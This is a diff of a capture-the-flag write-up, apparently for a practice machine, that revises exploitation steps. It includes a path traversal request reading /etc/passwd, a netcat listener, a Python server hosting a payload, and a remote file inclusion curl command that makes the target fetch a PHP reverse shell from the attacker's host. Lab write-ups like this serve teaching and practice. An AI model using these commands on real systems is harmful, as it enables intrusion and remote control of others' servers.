@@ -111,7 +111,7 @@ Now, let's go to **searchsploit** and search if there is any vulnerability docum
   /alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
   
   so the full URL becomes:
-  http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+  curl http://10.10.74.120/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 
   ```
 
@@ -127,31 +127,31 @@ STEP 2: Open up an HTTP server to transfer the payload to the target machine
 ```sh
   sudo python3 -m http.server 80
   ```
-![image](https://user-images.githubusercontent.com/99097743/170799511-a9cb1b0c-3cb8-49e2-8aa6-af2d5cc0eff9.png)
-
+  
 STEP 3: Turn on the listener
 ```sh
 sudo nc -lvnp 87
  ```
- 
- ![image](https://user-images.githubusercontent.com/99097743/170799539-6d6f535a-4de8-41f8-8860-5bfe58f86896.png)
 
-
-STEP 3: Modify the PHP Injection URL:
-
-```sh
-http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://
-  ```
-  
-STEP 4: Upload the PHP file from the localhost using the HTTP server and invoke the listener
+STEP 4: Modify the PHP Injection URL:
 
 ```sh
 curl  http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.123.93:80/RS.php
   ```
+  
+STEP 5: Upload the PHP file from the localhost using the HTTP server and invoke the listener
 
-Niceeee!! it works:
+Niceeee!! it works: 
 
-![image](https://user-images.githubusercontent.com/99097743/170799708-ca8f61e3-ba39-462a-b38d-c67ea5661769.png)
+
+This picture gives an overall summary of the steps followed:
+
+![Screenshot 2022-05-27 191059](https://user-images.githubusercontent.com/99097743/170802509-703b2ac1-1a5c-4edc-a61e-c0b925793b0f.png)
+
+
+
+
+
 
 Let's stabilize the shell!
 
